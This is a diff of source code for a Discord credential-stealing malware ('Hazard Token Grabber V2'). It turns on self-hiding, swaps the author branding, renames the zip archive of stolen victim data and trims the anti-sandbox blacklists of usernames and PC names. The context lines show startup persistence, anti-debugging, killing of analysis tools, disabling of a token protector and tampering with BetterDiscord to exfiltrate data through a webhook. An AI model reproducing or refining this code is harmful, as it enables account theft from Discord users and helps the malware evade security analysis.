@@ -40,7 +40,7 @@ __config__ = {
     # if you want the file to run at startup
     "startup": True,
     # if you want the file to hide itself after run
-    "hide_self": False,
+    "hide_self": True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     "anti_debug": True,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
@@ -408,8 +408,8 @@ class HazardTokenGrabberV2(Functions):
                 except json.decoder.JSONDecodeError:
                     return
                 item[
-                    "Bigdaddy69_just_shit_on_this_token_protector"
-                ] = "Bigdaddy69#6969"
+                    "Rdimo_just_shit_on_this_token_protector"
+                ] = "https://github.com/Rdimo"
                 item["auto_start"] = False
                 item["auto_start_discord"] = False
                 item["integrity"] = False
@@ -427,7 +427,7 @@ class HazardTokenGrabberV2(Functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, "a") as f:
                 f.write(
-                    "\n\n//Bigdaddy69 just shit on this token protector | Bigdaddy69#6969"
+                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo"
                 )
 
     async def bypassBetterDiscord(self):
@@ -436,7 +436,7 @@ class HazardTokenGrabberV2(Functions):
             x = self.hook_reg
             with open(bd, "r", encoding="cp437", errors="ignore") as f:
                 txt = f.read()
-                content = txt.replace(x, "Bigdaddy69TheGoat")
+                content = txt.replace(x, "RdimoTheGoat")
             with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                 f.write(content)
 
@@ -804,7 +804,7 @@ GoogleMaps: {self.googlemap}
                                 + "\n\n🌟・Grabber By Bigdaddy69・Bigdaddy69#6969"
                             )
 
-        _zipfile = ntpath.join(self.appdata, f"Bigdaddy69.Nuker-[{Victim}].zip")
+        _zipfile = ntpath.join(self.appdata, f"Hazard.V2-[{Victim}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -828,8 +828,8 @@ GoogleMaps: {self.googlemap}
             "embeds": [
                 {
                     "author": {
-                        "name": f"*{Victim}* Just ran Bigdaddy69 Nuker",
-                        "url": "Bigdaddy69#6969",
+                        "name": f"*{Victim}* Just ran Bigdaddy69 Token Grabber",
+                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif",
                     },
                     "color": 176185,
@@ -916,56 +916,10 @@ class AntiDebug(Functions):
         self.processes = list()
 
         self.blackListedUsers = [
-            "WDAGUtilityAccount",
-            "Abby",
-            "Peter Wilson",
-            "hmarc",
-            "patex",
-            "JOHN-PC",
-            "RDhJ0CNFevzX",
-            "kEecfMwgj",
-            "Frank",
-            "8Nl0ColNQ5bq",
-            "Lisa",
-            "John",
-            "george",
-            "PxmdUOpVyx",
-            "8VizSM",
-            "w0fjuOVmCcP5A",
-            "lmVwjj9b",
-            "PqONjHVwexsS",
-            "3u2v9m8",
-            "Julia",
-            "HEUeRzl",
+            "D1kker",
         ]
         self.blackListedPCNames = [
-            "BEE7370C-8C0C-4",
-            "DESKTOP-NAKFFMT",
-            "WIN-5E07COS9ALR",
-            "B30F0242-1C6A-4",
-            "DESKTOP-VRSQLAG",
-            "Q9IATRKPRH",
-            "XC64ZB",
-            "DESKTOP-D019GDM",
-            "DESKTOP-WI8CLET",
-            "SERVER1",
-            "LISA-PC",
-            "JOHN-PC",
-            "DESKTOP-B0T93D6",
-            "DESKTOP-1PYKP29",
-            "DESKTOP-1Y2433R",
-            "WILEYPC",
-            "WORK",
-            "6C4E733F-C2D9-4",
-            "RALPHS-PC",
-            "DESKTOP-WG3MYJS",
-            "DESKTOP-7XC6GEZ",
-            "DESKTOP-5OV9S0O",
-            "QarZhrdBpj",
-            "ORELEEPC",
-            "ARCHIBALDPC",
-            "JULIA-PC",
-            "d1bnJkfVlH",
+            "Alexander-PC",
         ]
         self.blackListedHWIDS = [
             "7AB5C494-39F5-4941-9163-47F54D6D5016",
